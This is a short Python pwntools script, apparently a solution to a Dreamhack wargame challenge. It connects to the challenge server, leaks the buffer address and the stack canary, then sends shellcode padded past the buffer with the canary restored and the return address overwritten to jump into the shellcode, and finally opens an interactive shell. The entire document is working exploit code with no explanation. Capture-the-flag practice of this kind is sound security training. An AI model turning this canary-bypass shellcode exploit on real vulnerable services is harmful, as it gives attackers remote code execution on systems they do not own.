from pwn import *
context.arch = 'amd64'

p = remote('host3.dreamhack.games', 18839)
shell = asm(shellcraft.sh())

p.recvuntil("Address of the buf: ")
buf = int(p.recv(14), 16)

payload = b'a' * 0x59
p.sendafter('Input: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recv(7))

payload = shell + b'a' * (88 - len(shell)) + p64(canary) + b'a' * 8 + p64(buf)
p.sendlineafter('Input: ', payload)
p.interactive()